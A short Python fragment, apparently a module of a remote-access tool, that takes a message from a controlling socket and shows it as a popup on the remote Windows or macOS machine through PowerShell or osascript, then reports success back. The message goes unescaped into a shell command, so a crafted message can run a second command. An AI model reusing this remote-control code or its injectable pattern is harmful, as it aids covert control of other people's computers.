import ctypes

if win_client():
    message=receive(client_socket)
    cmd = 'powershell "(new-object -ComObject wscript.shell).Popup(\\"{}\\",0,\\"Windows\\")"'.format(message)
    start_command(cmd)
    resp = "[+] Popup window successfully executed\n"
    send(client_socket,resp)
if osx_client():
    message=receive(client_socket)
    cmd = "osascript -e 'tell app \"System Events\" to display dialog \"{}\" buttons {{\"OK\"}} default button \"OK\" '".format(message)
    start_command(cmd)
    resp = "[+] Popup window successfully executed\n"
    send(client_socket,resp)
